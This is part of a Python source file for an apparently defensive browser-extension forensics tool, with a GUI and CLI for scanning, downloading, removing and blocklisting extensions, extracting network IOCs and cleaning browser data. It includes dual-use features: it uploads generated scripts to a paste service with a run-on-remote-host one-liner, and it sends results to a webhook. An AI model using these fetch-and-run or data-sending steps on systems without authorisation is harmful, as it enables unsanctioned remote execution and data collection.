        def show_permissions_dictionary(self):
            """Show the permissions dictionary lookup dialog"""
            dialog = self._make_toplevel()
            dialog.title("Extension Permissions Reference")
            self._fit_to_screen(dialog, 900, 700)
            
            # Header
            header = ttk.Frame(dialog, padding="10")
            header.pack(fill="x")
            ttk.Label(header, text="📖 Extension Permissions Reference",
                     font=("Segoe UI", 14, "bold")).pack(anchor="w")
            ttk.Label(header, text="Search and learn about browser extension permissions",
                     foreground="#666").pack(anchor="w")
            
            # Search
            search_frame = ttk.LabelFrame(dialog, text="  Search & Filter  ", padding="10", style="Section.TLabelframe")
            search_frame.pack(fill="x", padx=10, pady=5)
            
            ttk.Label(search_frame, text="Search permission:").pack(side="left", padx=(0, 5))
            search_var = tk.StringVar()
            search_entry = ttk.Entry(search_frame, textvariable=search_var, width=40)
            search_entry.pack(side="left", padx=(0, 10))
            
            # Risk filter
            ttk.Label(search_frame, text="Risk level:").pack(side="left", padx=(0, 5))
            risk_var = tk.StringVar(value="All")
            risk_combo = ttk.Combobox(search_frame, textvariable=risk_var, 
                                     values=["All", "CRITICAL", "HIGH", "MEDIUM", "LOW"],
                                     state="readonly", width=12)
            risk_combo.pack(side="left")
            
            # Split view: list and details
            paned = ttk.PanedWindow(dialog, orient="horizontal")
            paned.pack(fill="both", expand=True, padx=10, pady=5)
            
            # Permissions list
            list_frame = ttk.LabelFrame(paned, text="  List  ", padding="5", style="Section.TLabelframe")
            paned.add(list_frame, weight=1)
            
            perm_listbox = tk.Listbox(list_frame, font=("Consolas", 10), width=30)
            perm_scrollbar = ttk.Scrollbar(list_frame, orient="vertical", command=perm_listbox.yview)
            perm_listbox.configure(yscrollcommand=perm_scrollbar.set)
            
            perm_listbox.pack(side="left", fill="both", expand=True)
            perm_scrollbar.pack(side="right", fill="y")
            
            # Details panel
            details_frame = ttk.LabelFrame(paned, text="  Permission Details  ", padding="5", style="Section.TLabelframe")
            paned.add(details_frame, weight=2)
            
            details_text = scrolledtext.ScrolledText(details_frame, font=("Segoe UI", 10), wrap="word")
            details_text.pack(fill="both", expand=True)
            
            # Configure text tags for formatting
            details_text.tag_configure("title", font=("Segoe UI", 12, "bold"))
            details_text.tag_configure("section", font=("Segoe UI", 10, "bold"), foreground="#333")
            details_text.tag_configure("critical", foreground="#cc0000", font=("Segoe UI", 10, "bold"))
            details_text.tag_configure("high", foreground="#cc6600", font=("Segoe UI", 10, "bold"))
            details_text.tag_configure("medium", foreground="#cccc00", font=("Segoe UI", 10, "bold"))
            details_text.tag_configure("low", foreground="#00cc00", font=("Segoe UI", 10, "bold"))
            details_text.tag_configure("bullet", foreground="#666")
            
            def populate_list():
                perm_listbox.delete(0, "end")
                search_text = search_var.get().lower()
                risk_filter = risk_var.get()
                
                for perm, info in sorted(PERMISSIONS_DICTIONARY.items()):
                    # Apply filters
                    if search_text and search_text not in perm.lower() and search_text not in info["description"].lower():
                        continue
                    if risk_filter != "All" and info.get("risk_level") != risk_filter:
                        continue
                    
                    # Add risk indicator as keyword
                    risk = info.get("risk_level", "?")
                    indicator = {"CRITICAL": "[CRIT]", "HIGH": "[HIGH]", "MEDIUM": "[MED]", "LOW": "[LOW]"}.get(risk, "")
                    perm_listbox.insert("end", f"{indicator} {perm}")
            
            def show_permission_details(event=None):
                selection = perm_listbox.curselection()
                if not selection:
                    return
                
                # Extract permission name (remove indicator like [CRIT], [HIGH], etc.)
                item = perm_listbox.get(selection[0])
                # Find the permission name after the ] bracket
                if "]" in item:
                    perm = item.split("]", 1)[1].strip()
                else:
                    perm = item.strip()
                
                info = PERMISSIONS_DICTIONARY.get(perm)
                if not info:
                    return
                
                details_text.config(state="normal")
                details_text.delete(1.0, "end")
                
                # Title
                details_text.insert("end", f"{perm}\n", "title")
                
                # Risk level
                risk = info.get("risk_level", "UNKNOWN")
                risk_tag = risk.lower()
                details_text.insert("end", f"\nRisk Level: ", "section")
                details_text.insert("end", f"{risk}\n", risk_tag)
                
                # Description
                details_text.insert("end", f"\nDescription:\n", "section")
                details_text.insert("end", f"{info['description']}\n")
                
                # Legitimate uses
                details_text.insert("end", f"\n[OK] Legitimate Uses:\n", "section")
                for use in info.get("legitimate_uses", []):
                    details_text.insert("end", f"  • {use}\n", "bullet")
                
                # Malicious uses
                details_text.insert("end", f"\nPotential Malicious Uses:\n", "section")
                for use in info.get("malicious_uses", []):
                    details_text.insert("end", f"  • {use}\n", "bullet")
                
                details_text.config(state="disabled")
            
            # Bind events
            perm_listbox.bind("<<ListboxSelect>>", show_permission_details)
            search_var.trace_add("write", lambda *args: populate_list())
            risk_combo.bind("<<ComboboxSelected>>", lambda e: populate_list())
            
            # Initial population
            populate_list()
            
            legend_frame = ttk.Frame(dialog, padding="10")
            legend_frame.pack(fill="x")
            ttk.Label(legend_frame, text="Risk: [CRIT]=Critical  [HIGH]=High  [MED]=Medium  [LOW]=Low",
                     font=("Segoe UI", 9), foreground="#666").pack(side="left")
            ttk.Button(legend_frame, text="Close", command=dialog.destroy, width=10).pack(side="right")
            
        def show_batch_domains_dialog(self):
            """Show dialog for batch domain extraction from extension IDs"""
            dialog = self._make_toplevel()
            dialog.title("Batch Network IOC Extraction")
            self._fit_to_screen(dialog, 950, 850, min_w=800, min_h=700)

            header = ttk.Frame(dialog, padding="10")
            header.pack(fill="x")
            ttk.Label(header, text="Batch Network IOC Extraction",
                     font=("Segoe UI", 14, "bold")).pack(anchor="w")
            ttk.Label(header, text="Download extensions by ID and extract all network artifacts (domains, IPs, URLs) they communicate with",
                     foreground="#666").pack(anchor="w")

            input_frame = ttk.LabelFrame(dialog, text="  Extension IDs  ", padding="10", style="Section.TLabelframe")
            input_frame.pack(fill="x", padx=10, pady=5)

            ttk.Label(input_frame, text="Paste extension IDs (one per line), raw JSON lister output, or load from a file:").pack(anchor="w")

            id_text = scrolledtext.ScrolledText(input_frame, font=("Consolas", 10), height=6, wrap="word")
            id_text.pack(fill="x", pady=(5, 5))

            load_btn_frame = ttk.Frame(input_frame)
            load_btn_frame.pack(fill="x")

            def load_from_file():
                from tkinter import filedialog
                filepath = filedialog.askopenfilename(
                    title="Select file with extension IDs",
                    filetypes=[("All files", "*.*"), ("Text files", "*.txt"), ("CSV files", "*.csv"), ("JSON files", "*.json")]
                )
                if filepath:
                    try:
                        with open(filepath, 'r', encoding='utf-8', errors='ignore') as f:
                            content = f.read()
                        id_text.delete("1.0", "end")
                        id_text.insert("1.0", content)
                        update_id_count()
                    except Exception as ex:
                        messagebox.showerror("Error", f"Could not read file: {ex}")

            ttk.Button(load_btn_frame, text="Load from File", command=load_from_file).pack(side="left", padx=(0, 5))
            id_count_label = ttk.Label(load_btn_frame, text="0 IDs detected", foreground="#666")
            id_count_label.pack(side="right")

            id_pattern = re.compile(r'\b([a-z]{32})\b')

            def _parse_extension_ids(raw_text):
                """Extract unique extension IDs from raw text, supporting plain IDs, CSV, and JSON lister output."""
                ids = []
                seen = set()

                # Try parsing as JSON lister output first
                stripped = raw_text.strip()
                if stripped.startswith('{') or stripped.startswith('['):
                    try:
                        data = json.loads(stripped)
                        ext_list = None
                        if isinstance(data, dict) and 'extensions' in data:
                            ext_list = data['extensions']
                        elif isinstance(data, list):
                            ext_list = data
                        if ext_list:
                            for ext in ext_list:
                                if isinstance(ext, dict) and 'id' in ext:
                                    eid = ext['id'].strip().lower()
                                    if len(eid) == 32 and eid.isalpha() and eid not in seen:
                                        seen.add(eid)
                                        ids.append(eid)
                            if ids:
                                return ids
                    except (json.JSONDecodeError, TypeError):
                        pass

                # Fallback: regex scan for 32-char lowercase alpha IDs
                for eid in id_pattern.findall(raw_text):
                    if eid not in seen:
                        seen.add(eid)
                        ids.append(eid)
                return ids

            def update_id_count(*_args):
                raw = id_text.get("1.0", "end")
                ids = _parse_extension_ids(raw)
                id_count_label.config(text=f"{len(ids)} unique IDs detected")

            id_text.bind("<KeyRelease>", update_id_count)

            progress_frame = ttk.Frame(dialog, padding="10")
            progress_frame.pack(fill="x", padx=10)
            progress_var = tk.DoubleVar()
            progress_bar = ttk.Progressbar(progress_frame, variable=progress_var, maximum=100)
            progress_bar.pack(fill="x")
            status_label = ttk.Label(progress_frame, text="Ready", foreground="#666")
            status_label.pack(anchor="w", pady=(2, 0))

            results_frame = ttk.LabelFrame(dialog, text="  Results  ", padding="10", style="Section.TLabelframe")
            results_frame.pack(fill="both", expand=True, padx=10, pady=5)

            results_text = scrolledtext.ScrolledText(results_frame, font=("Consolas", 9), wrap="word", state="disabled")
            results_text.pack(fill="both", expand=True)

            extraction_results = {}

            def run_extraction():
                raw = id_text.get("1.0", "end")
                found_ids = _parse_extension_ids(raw)
                if not found_ids:
                    messagebox.showwarning("No IDs", "No valid 32-character extension IDs found in the input.")
                    return

                start_btn.config(state="disabled")
                export_btn.config(state="disabled")
                results_text.config(state="normal")
                results_text.delete("1.0", "end")
                results_text.config(state="disabled")
                progress_var.set(0)
                status_label.config(text=f"Processing 0/{len(found_ids)}...")

                def do_work():
                    def progress_cb(current, total, ext_id, ext_name):
                        pct = ((current + 1) / total) * 100
                        dialog.after(0, lambda: progress_var.set(pct))
                        dialog.after(0, lambda n=ext_name, c=current, t=total:
                                     status_label.config(text=f"[{c+1}/{t}] {n}"))

                    try:
                        result = self.manager.batch_extract_domains(
                            found_ids, progress_callback=progress_cb
                        )
                    except Exception as ex:
                        dialog.after(0, lambda: messagebox.showerror("Error", str(ex)))
                        dialog.after(0, lambda: start_btn.config(state="normal"))
                        return

                    nonlocal extraction_results
                    extraction_results = result

                    def show_results():
                        results_text.config(state="normal")
                        results_text.delete("1.0", "end")

                        results_text.insert("end", f"{'='*60}\n")
                        results_text.insert("end", f"  BATCH DOMAIN EXTRACTION RESULTS\n")
                        results_text.insert("end", f"{'='*60}\n")
                        results_text.insert("end", f"  Extensions analyzed: {len(result['extensions'])}\n")
                        results_text.insert("end", f"  Unique domains/IPs: {len(result['all_domains'])}\n")
                        if result['errors']:
                            results_text.insert("end", f"  Errors:             {len(result['errors'])}\n")
                        results_text.insert("end", "\n")

                        for ext_entry in result['extensions']:
                            risk = ext_entry['risk'].upper()
                            results_text.insert("end", f"  [{risk:8s}] {ext_entry['name']} ({ext_entry['id']}) — {ext_entry['domain_count']} domains\n")

                        if result['all_domains']:
                            results_text.insert("end", f"\n  All extracted domains/IPs ({len(result['all_domains'])}):\n")
                            results_text.insert("end", f"  {'-'*56}\n")
                            for dom in sorted(result['all_domains'].keys()):
                                sources = result['all_domains'][dom]
                                ext_names = list({s['ext_name'] for s in sources})
                                label = ', '.join(ext_names[:3])
                                if len(ext_names) > 3:
                                    label += f", +{len(ext_names)-3} more"
                                results_text.insert("end", f"    {dom:45s} <- {label}\n")

                        if result['errors']:
                            results_text.insert("end", f"\n  Errors:\n")
                            for err in result['errors']:
                                results_text.insert("end", f"    [!] {err}\n")

                        results_text.config(state="disabled")
                        status_label.config(text=f"Done — {len(result['extensions'])} extensions, {len(result['all_domains'])} unique domains/IPs")
                        start_btn.config(state="normal")
                        if result['all_domains']:
                            export_btn.config(state="normal")

                    dialog.after(0, show_results)

                import threading
                threading.Thread(target=do_work, daemon=True).start()

            def export_results():
                if not extraction_results or not extraction_results.get('all_domains'):
                    messagebox.showwarning("No Data", "Run an extraction first.")
                    return
                from tkinter import filedialog
                filepath = filedialog.asksaveasfilename(
                    title="Export domain extraction results",
                    defaultextension=".csv",
                    filetypes=[("CSV files", "*.csv"), ("Text files", "*.txt"), ("All files", "*.*")]
                )
                if not filepath:
                    return
                try:
                    with open(filepath, 'w', encoding='utf-8', newline='') as f:
                        import csv as csv_mod
                        writer = csv_mod.writer(f)
                        writer.writerow(["Domain/IP", "Source Extensions", "Source Files"])
                        for dom in sorted(extraction_results['all_domains'].keys()):
                            sources = extraction_results['all_domains'][dom]
                            ext_names = ', '.join(sorted({s['ext_name'] for s in sources}))
                            all_files = []
                            for s in sources:
                                all_files.extend(s.get('files', []))
                            source_files = ', '.join(sorted(set(all_files))[:10])
                            writer.writerow([dom, ext_names, source_files])
                    messagebox.showinfo("Exported", f"Results saved to:\n{filepath}")
                except Exception as ex:
                    messagebox.showerror("Export Error", str(ex))

            btn_frame = ttk.Frame(dialog, padding="10")
            btn_frame.pack(fill="x")
            start_btn = ttk.Button(btn_frame, text="Extract Domains", command=run_extraction, style="Primary.TButton")
            start_btn.pack(side="left", padx=(0, 5))
            export_btn = ttk.Button(btn_frame, text="Export CSV", command=export_results, state="disabled")
            export_btn.pack(side="left", padx=(0, 5))
            ttk.Button(btn_frame, text="Close", command=dialog.destroy).pack(side="right")

        def run(self):
            self.root.mainloop()
    
    app = ExtensionManagerGUI()
    app.run()


def run_cli(args):
    """Run the command-line interface"""
    manager = BrowserExtensionManager(verbose=True)
    _allowed = frozenset({"chrome", "edge", "brave"})
    browsers_filter = None
    if args.browsers:
        parts = [p.strip().lower() for p in args.browsers.split(",") if p.strip()]
        unknown = [p for p in parts if p not in _allowed]
        if unknown:
            print(f"Error: unsupported browser(s): {', '.join(unknown)}. Supported: chrome, edge, brave")
            sys.exit(1)
        browsers_filter = parts
    
    # --- Extension download from Web Store ---
    if args.download_extension or args.download_url:
        if not REQUESTS_AVAILABLE:
            print("Error: requests library required. Install with: pip install requests")
            sys.exit(1)
        
        if args.download_url:
            try:
                ext_id = ChromeWebStoreURLBuilder.parse_webstore_url(args.download_url)
                print(f"Extracted extension ID: {ext_id}")
            except Exception as e:
                print(f"Error parsing URL: {e}")
                sys.exit(1)
        else:
            ext_id = args.download_extension
        
        print(f"\nDownloading extension: {ext_id}")
        print(f"Output directory: {args.download_dir}")
        
        try:
            downloader = ExtensionDownloader(output_dir=args.download_dir, verbose=True)
            result = downloader.download(ext_id, extract=args.extract)
            
            print(f"\nSuccess!")
            print(f"  ZIP file: {result['zip_file']}")
            print(f"  Size: {ExtensionDownloader._format_size(result['size'])}")
            
            if result.get('extracted_dir'):
                print(f"  Extracted to: {result['extracted_dir']}")
            
            if result.get('manifest'):
                manifest = result['manifest']
                print(f"\nExtension Info:")
                print(f"  Name:        {manifest.get('name', 'Unknown')}")
                print(f"  Version:     {manifest.get('version', 'Unknown')}")
                print(f"  Description: {manifest.get('description', '')[:100]}")
                perms = manifest.get('permissions', [])
                if perms:
                    print(f"  Permissions: {', '.join(str(p) for p in perms[:5])}")
                    if len(perms) > 5:
                        print(f"               +{len(perms)-5} more")
        except Exception as e:
            print(f"Download failed: {e}")
            sys.exit(1)
        return
    
    # --- Copy installed extension ---
    if args.copy_installed:
        print(f"\nCopying installed extension: {args.copy_installed}")
        manager.scan_extensions()
        extensions = manager.find_extension_by_id(args.copy_installed)
        if not extensions:
            print(f"Extension not found: {args.copy_installed}")
            sys.exit(1)
        for ext in extensions:
            try:
                result = manager.download_installed_extension(ext, args.download_dir)
                print(f"  Copied: {ext.name} ({ext.browser}/{ext.profile}) -> {result['output_dir']}")
            except Exception as e:
                print(f"  Failed: {ext.name}: {e}")
        return
    
    # --- Batch domain extraction from extension ID list ---
    if args.extract_domains:
        input_file = args.extract_domains
        if not os.path.isfile(input_file):
            print(f"Error: File not found: {input_file}")
            sys.exit(1)

        with open(input_file, 'r', encoding='utf-8', errors='ignore') as f:
            raw_content = f.read()

        # Parse extension IDs: accept JSON lister output, bare IDs, CSV rows, etc.
        ext_ids = []
        seen = set()
        id_pattern = re.compile(r'\b([a-z]{32})\b')

        stripped = raw_content.strip()
        if stripped.startswith('{') or stripped.startswith('['):
            try:
                data = json.loads(stripped)
                ext_list = None
                if isinstance(data, dict) and 'extensions' in data:
                    ext_list = data['extensions']
                elif isinstance(data, list):
                    ext_list = data
                if ext_list:
                    for ext in ext_list:
                        if isinstance(ext, dict) and 'id' in ext:
                            eid = ext['id'].strip().lower()
                            if len(eid) == 32 and eid.isalpha() and eid not in seen:
                                seen.add(eid)
                                ext_ids.append(eid)
            except (json.JSONDecodeError, TypeError):
                pass

        if not ext_ids:
            for line in raw_content.splitlines():
                line = line.strip()
                if not line or line.startswith('#') or line.startswith('Extension') or line.startswith('='):
                    continue
                for eid in id_pattern.findall(line):
                    if eid not in seen:
                        seen.add(eid)
                        ext_ids.append(eid)

        if not ext_ids:
            print("No valid 32-character extension IDs found in the input file.")
            sys.exit(1)

        print(f"\nBatch Network IOC Extraction")
        print(f"  Input:      {input_file}")
        print(f"  Extensions: {len(ext_ids)}")
        if args.domains_output:
            print(f"  Output:     {args.domains_output}")
        print()

        def cli_progress(current, total, ext_id, ext_name):
            print(f"  [{current+1}/{total}] {ext_id} — {ext_name}")

        results = manager.batch_extract_domains(
            ext_ids,
            output_file=getattr(args, 'domains_output', None),
            progress_callback=cli_progress,
        )

        # Print summary
        print(f"\n{'='*60}")
        print(f"  RESULTS")
        print(f"{'='*60}")
        print(f"  Extensions analyzed: {len(results['extensions'])}")
        print(f"  Unique domains/IPs: {len(results['all_domains'])}")
        if results['errors']:
            print(f"  Errors:             {len(results['errors'])}")
        print()

        for ext_entry in results['extensions']:
            risk = ext_entry['risk'].upper()
            print(f"  [{risk:8s}] {ext_entry['name']} ({ext_entry['id']}) — {ext_entry['domain_count']} domains")

        if results['all_domains']:
            print(f"\n  All extracted domains/IPs ({len(results['all_domains'])}):")
            print(f"  {'-'*56}")
            for dom in sorted(results['all_domains'].keys()):
                sources = results['all_domains'][dom]
                ext_names = list({s['ext_name'] for s in sources})
                label = ', '.join(ext_names[:3])
                if len(ext_names) > 3:
                    label += f", +{len(ext_names)-3} more"
                print(f"    {dom:45s} <- {label}")

        if results['errors']:
            print(f"\n  Errors:")
            for err in results['errors']:
                print(f"    [!] {err}")

        if args.domains_output:
            print(f"\n  Full results saved to: {args.domains_output}")

        return

    # --- Scan extension from local path ---
    if args.scan_path:
        print(f"\nScanning extension at: {args.scan_path}")
        try:
            ext = manager.scan_extension_from_path(args.scan_path)
        except (FileNotFoundError, ValueError) as e:
            print(f"Error: {e}")
            sys.exit(1)

        risk = ext.calculate_risk_level()
        risk_label = risk.upper()
        print(f"\n{'='*60}")
        print(f"  Extension: {ext.name}")
        print(f"  Version:   {ext.version}")
        print(f"  ID:        {ext.id}")
        print(f"  Manifest:  v{ext.manifest_version}")
        print(f"  Risk:      {risk_label}")
        print(f"{'='*60}")

        if ext.permissions:
            print(f"\n  API Permissions ({len(ext.permissions)}):")
            for p in ext.permissions:
                info = PERMISSIONS_DICTIONARY.get(p, {})
                plevel = info.get("risk_level", "LOW")
                print(f"    [{plevel:8s}] {p}")

        if ext.host_permissions:
            print(f"\n  Host Permissions ({len(ext.host_permissions)}):")
            for h in ext.host_permissions:
                print(f"    {h}")

        if ext.content_scripts:
            print(f"\n  Content Script Matches ({len(ext.content_scripts)}):")
            for cs in ext.content_scripts[:10]:
                print(f"    {cs}")
            if len(ext.content_scripts) > 10:
                print(f"    ... +{len(ext.content_scripts)-10} more")

        if ext.csp_issues:
            print(f"\n  !! CSP Issues ({len(ext.csp_issues)}):")
            for issue in ext.csp_issues:
                print(f"    [!] {issue}")

        if ext.sri_issues:
            print(f"\n  !! SRI Issues ({len(ext.sri_issues)}):")
            print(f"    External resources without integrity hash:")
            for sri in ext.sri_issues[:10]:
                label = {"script": "Script", "stylesheet": "CSS", "js_fetch": "JS Fetch"}.get(sri['type'], sri['type'])
                print(f"    [{label:10s}] {sri['url']}")
                print(f"                in {sri['file']}")
            if len(ext.sri_issues) > 10:
                print(f"    ... +{len(ext.sri_issues)-10} more")

        if ext.heuristics:
            print(f"\n  !! Heuristic Warnings ({len(ext.heuristics)}):")
            for h in ext.heuristics:
                print(f"    [!] {h}")

        if ext.dnr_warnings:
            print(f"\n  !! DNR Warnings ({len(ext.dnr_warnings)}):")
            for d in ext.dnr_warnings:
                print(f"    [!] {d}")

        if ext.extracted_domains:
            print(f"\n  Extracted Domains ({len(ext.extracted_domains)}):")
            for dom, files in list(ext.extracted_domains.items())[:20]:
                print(f"    {dom:40s} <- {', '.join(files)}")
            if len(ext.extracted_domains) > 20:
                print(f"    ... +{len(ext.extracted_domains)-20} more")

        # VT scan
        if getattr(args, 'vt_api_key', None):
            print(f"\n  Running VirusTotal scan...")
            vt_results = manager.scan_with_virustotal(ext, args.vt_api_key)
            if vt_results.get("error"):
                print(f"  VT Error: {vt_results['error']}")
            else:
                flagged_files = [f for f in vt_results.get("file_hashes", [])
                                 if f.get("vt_result") and isinstance(f["vt_result"], dict)
                                 and f["vt_result"].get("malicious", 0) > 0]
                flagged_domains = [d for d in vt_results.get("domain_results", [])
                                   if d.get("vt_result") and isinstance(d["vt_result"], dict)
                                   and d["vt_result"].get("malicious", 0) > 0]
                scanned_files = len(vt_results.get("file_hashes", []))
                scanned_domains = len(vt_results.get("domain_results", []))
                print(f"  VT Results: {scanned_files} files scanned, {scanned_domains} domains scanned")
                if flagged_files:
                    print(f"\n  !! FLAGGED FILES ({len(flagged_files)}):")
                    for ff in flagged_files:
                        vt = ff["vt_result"]
                        print(f"    {ff['file']} — {vt['malicious']} malicious, {vt.get('suspicious',0)} suspicious")
                        print(f"      {vt.get('link', '')}")
                if flagged_domains:
                    print(f"\n  !! FLAGGED DOMAINS ({len(flagged_domains)}):")
                    for fd in flagged_domains:
                        vt = fd["vt_result"]
                        print(f"    {fd['domain']} — {vt['malicious']} malicious, {vt.get('suspicious',0)} suspicious")
                        print(f"      {vt.get('link', '')}")
                if not flagged_files and not flagged_domains:
                    print(f"  No malicious detections found.")

        # Export forensic report
        if args.export_report:
            if manager.generate_html_report([ext], args.export_report):
                print(f"\n[+] Forensic HTML report saved to: {args.export_report}")
            else:
                print(f"\n[-] Failed to generate HTML report")

        # Export graph
        if args.export_graph:
            if manager.generate_extension_graph(ext, args.export_graph):
                print(f"[+] Extension graph saved to: {args.export_graph}")
            else:
                print(f"[-] Failed to generate extension graph")

        return

    # --- List extensions ---
    if args.list_extensions:
        home_dirs = manager._discover_home_dirs()
        print(f"\nScanning for installed extensions ({len(home_dirs)} user directory/ies)...\n")
        extensions = manager.scan_extensions(browsers=browsers_filter)
        if getattr(args, 'enrich', False) and REQUESTS_AVAILABLE:
            print("Fetching Chrome Web Store metadata...")
            enriched = manager.enrich_extensions_metadata(extensions)
            print(f"  Enriched {enriched} of {len(set(e.id for e in extensions))} unique extensions\n")
        if args.export_report:
            if manager.generate_html_report(extensions, args.export_report):
                print(f"[+] Forensic HTML report generated at {args.export_report}")
            else:
                print(f"[-] Failed to generate HTML report")
        print(manager.format_extension_list(extensions, show_details=args.details))
        return
    
    # --- Remove extension ---
    if args.remove_extension:
        print("\nScanning for installed extensions...")
        all_exts = manager.scan_extensions(browsers=browsers_filter)
        home_dirs = manager._discover_home_dirs()
        browser_paths = manager.get_browser_paths()
        found_browsers = {k: v for k, v in browser_paths.items() if v}
        if not found_browsers:
            print(f"  No browser data found (searched {len(home_dirs)} user directory/ies)")
        else:
            print(f"  Scanned {len(home_dirs)} user(s), found {len(all_exts)} extension(s) across {sum(len(v) for v in found_browsers.values())} browser path(s)")
        extensions = manager.find_extension_by_id(args.remove_extension)
        if not extensions:
            print(f"\nExtension '{args.remove_extension}' not found")
            return
        
        running = [b for b in set(e.browser for e in extensions) if manager.check_browser_running(b)]
        if running:
            if args.force:
                print(f"Closing running browser(s): {', '.join(running)}")
                failed = []
                for b in running:
                    if not manager.close_browser(b):
                        failed.append(b)
                if failed:
                    print(f"Error: Could not close: {', '.join(failed)}")
                    sys.exit(1)
            else:
                response = input(f"Browser(s) running: {', '.join(running)}. Close them now? [y/N]: ")
                if response.lower() == 'y':
                    failed = []
                    for b in running:
                        if not manager.close_browser(b):
                            failed.append(b)
                    if failed:
                        print(f"Error: Could not close: {', '.join(failed)}")
                        sys.exit(1)
                else:
                    print("Aborted. Close the browser(s) manually and retry.")
                    sys.exit(1)
        
        print(f"\nFound {len(extensions)} instance(s):")
        for ext in extensions:
            print(f"  - {ext.name} in {ext.browser}/{ext.profile}")
        
        if not args.force:
            response = input("\nRemove this extension? [y/N]: ")
            if response.lower() != 'y':
                print("Aborted.")
                return
        
        do_blocklist = not getattr(args, 'no_blocklist', False)
        results = manager.remove_extension_by_id(
            args.remove_extension,
            clean_preferences=getattr(args, 'clean_preferences', False),
            apply_blocklist=do_blocklist,
            allow_blocklist_elevation=not getattr(args, "no_blocklist_elevation", False),
        )
        removed = sum(r.items_removed for r in results if r.success)
        print(f"Removed {removed} instance(s)")
        if do_blocklist:
            print("Extension added to policy blocklist")
        
        if args.disable_sync:
            print("Disabling extension sync...")
            manager.disable_all_extension_sync(browsers_filter[0] if browsers_filter else None)
            print("Extension sync disabled.")
        return
    
    # --- Blocklist Management ---
    if args.list_blocklist:
        print("\nReading Windows Registry Blocklists...\n")
        blocklist = manager.get_blocklist()
        if not blocklist:
            if manager.system != "Windows":
                print("Blocklist management is only supported on Windows.")
            else:
                print("No blocklisted extensions found.")
        else:
            for browser, ext_ids in blocklist.items():
                print(f"[{browser.upper()}]")
                if not ext_ids:
                    print("  (Empty)")
                else:
                    for ext_id in ext_ids:
                        nm = manager.blocklist_display_name(browser, ext_id) or "?"
                        print(f"  - {nm}  ({ext_id})")
                print()
        return

    if args.unblock_extension:
        print(f"\nUnblocking extension: {args.unblock_extension}")
        results = manager.unblock_extension(args.unblock_extension)
        for r in results:
            print(f"  {r.details}")
        return

    if args.clear_blocklist:
        if not args.force:
            response = input("\nClear all browser ExtensionInstallBlocklists? [y/N]: ")
            if response.lower() != 'y':
                print("Aborted.")
                return
        print("\nClearing blocklists...")
        results = manager.clear_blocklist()
        for r in results:
            print(f"  {r.details}")
        return

    # --- Disable extension sync ---
    if args.disable_sync and not args.remove_extension:
        browser = browsers_filter[0] if browsers_filter else None
        print(f"\nDisabling extension sync{f' for {browser}' if browser else ' for all browsers'}...")
        results = manager.disable_all_extension_sync(browser)
        success = sum(1 for r in results if r.success)
        print(f"Done: {success} profile(s) updated")
        return
    
    # --- Clean browser data ---
    if args.clean_all or args.clean:
        browser_paths = manager.get_browser_paths()
        if browsers_filter:
            browser_paths = {k: v for k, v in browser_paths.items() if k in browsers_filter}
        
        running = [b for b in browser_paths.keys() if manager.check_browser_running(b)]
        if running:
            if args.force:
                print(f"Closing running browser(s): {', '.join(running)}")
                failed = [b for b in running if not manager.close_browser(b)]
                if failed:
                    print(f"Error: Could not close: {', '.join(failed)}")
                    sys.exit(1)
            else:
                response = input(f"Browser(s) running: {', '.join(running)}. Close them now? [y/N]: ")
                if response.lower() == 'y':
                    failed = [b for b in running if not manager.close_browser(b)]
                    if failed:
                        print(f"Error: Could not close: {', '.join(failed)}")
                        sys.exit(1)
                else:
                    print("Aborted. Close the browser(s) manually and retry.")
                    sys.exit(1)
        
        cleaning = []
        skipping = []
        # Built-in clean matches clean_profile(): localStorage, SW, cache, optional cookies only.
        for name, flag in [("localStorage", not args.no_storage),
                           ("cache", not args.no_cache),
                           ("serviceWorkers", not args.no_sw),
                           ("cookies", args.cookies)]:
            (cleaning if flag else skipping).append(name)
        
        print(f"\nBrowsers: {', '.join(browser_paths.keys())}")
        print(f"Cleaning: {', '.join(cleaning)}")
        if skipping:
            print(f"Skipping: {', '.join(skipping)}")
        
        if not args.force:
            response = input("\nProceed with cleanup? [y/N]: ")
            if response.lower() != 'y':
                print("Aborted.")
                return
        
        print("\nCleaning browser data...\n")
        results = manager.clean_all_browsers(
            browsers=browsers_filter,
            clean_storage=not args.no_storage,
            clean_sw=not args.no_sw,
            clean_cache=not args.no_cache,
            clean_cookies=args.cookies
        )
        
        success = sum(1 for r in results if r.success)
        items = sum(r.items_removed for r in results)
        print(f"\nCleanup complete: {success} operations, {items} items removed")
        return
    
    # --- Generate extension lister script ---
    if args.generate_lister:
        if args.target_os:
            target_os = args.target_os
        else:
            system = platform.system()
            if system == "Windows":
                target_os = "windows"
            elif system == "Darwin":
                target_os = "mac"
            else:
                target_os = "linux"
        
        script = manager.generate_lister_script(target_os,
            webhook_url=getattr(args, 'webhook_url', '') or '',
            enrich_metadata=getattr(args, 'enrich', False),
            extract_iocs=getattr(args, 'extract_iocs', False))
        
        if getattr(args, 'share', False):
            print("Uploading script...")
            try:
                lang = "powershell" if target_os in ("windows", "win") else "bash"
                result = BrowserExtensionManager.upload_script(script, lang)
                print(f"\nPaste URL:   {result['url']}")
                print(f"Raw URL:     {result['raw_url']}")
                print(f"\nRun on remote host:")
                print(f"  {result['oneliner']}")
                print(f"\nAlternative:")
                print(f"  {result['oneliner_alt']}")
                print(f"\nThe paste expires automatically. Use within 1 day.")
            except Exception as e:
                print(f"Upload failed: {e}", file=sys.stderr)
                sys.exit(1)
        elif args.output:
            with open(args.output, 'w', encoding='utf-8') as f:
                f.write(script)
            print(f"Extension lister script saved to: {args.output}")
        else:
            print(script)
        return
    
    # --- Generate scripts ---
    if args.generate_script:
        script_type = args.script_type
        
        target_browsers = None
        extensions_to_remove = None
        
        if script_type in ["powershell", "ps1", "bash", "sh", "python"]:
            b_input = input("Which browsers should this script target? (comma separated, e.g. Chrome,Edge or 'All'): ").strip()
            if b_input and b_input.lower() not in ["all", "any"]:
                target_browsers = [b.strip() for b in b_input.split(",")]
            
            e_input = input("Enter any Malicious Extension IDs to remove (comma separated, leave blank to skip): ").strip()
            if e_input:
                extensions_to_remove = [e.strip() for e in e_input.split(",")]
        
        if script_type == "js":
            script = manager.generate_browser_script(
                localstorage_keys=args.keys.split(",") if args.keys else None,
                domains=args.domains.split(",") if args.domains else None
            )
        else:
            fmt_map = {"python": "python", "powershell": "powershell", "ps1": "powershell",
                       "bash": "bash", "sh": "bash"}
            fmt = fmt_map.get(script_type, "python")
            script = manager.generate_remote_cleanup_script(
                fmt, target_browsers, extensions_to_remove,
                disable_sync=getattr(args, 'disable_sync', False),
                clean_preferences=getattr(args, 'clean_preferences', False),
                webhook_url=getattr(args, 'webhook_url', '') or '',
